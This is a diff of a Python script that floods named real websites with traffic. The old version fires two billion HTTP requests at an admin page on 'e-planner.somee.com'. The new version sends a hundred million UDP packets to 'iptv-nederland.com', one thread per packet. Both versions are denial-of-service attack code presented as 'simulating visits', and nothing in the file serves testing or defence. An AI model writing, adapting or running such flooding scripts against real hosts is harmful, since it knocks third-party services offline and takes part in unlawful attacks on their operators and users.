@@ -1,26 +1,39 @@
-import requests
-import concurrent.futures
+import socket
+import threading
 
-# URL of the website you want to send traffic to
-url = 'http://e-planner.somee.com/admin/admin.aspx'
+# Target IP address and port
+target_ip = 'iptv-nederland.com'  # Replace with the actual IP address if needed
+target_port = 80  # Replace with the correct UDP port
 
-# Number of requests to send
-num_requests = 2000000000
+# Number of visits you want to simulate
+number_of_visits = 100000000
 
-def send_request():
+# Define the message to send
+message = b"Test message for UDP traffic"  # Replace with the actual data you want to send
+
+
+def send_udp_packet(visit_number):
     try:
-        # Send the request without waiting for the response
-        requests.get(url, timeout=0.1)
-        # Optionally, you could print or log the success here
-    except requests.RequestException:
-        # Optionally, you could handle exceptions or log errors here
-        pass
+        # Create a UDP socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # Send the message
+        sock.sendto(message, (target_ip, target_port))
+        print(f"Packet {visit_number}: Sent")
+        sock.close()
+    except Exception as e:
+        print(f"Packet {visit_number}: Failed with exception {e}")
 
-def send_requests_concurrently():
-    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
-        futures = [executor.submit(send_request) for _ in range(num_requests)]
-        # Wait for all requests to be submitted
-        concurrent.futures.wait(futures, timeout=None)
+
+def simulate_traffic():
+    threads = []
+    for i in range(number_of_visits):
+        thread = threading.Thread(target=send_udp_packet, args=(i + 1,))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
 
 if __name__ == "__main__":
-    send_requests_concurrently()
+    simulate_traffic()
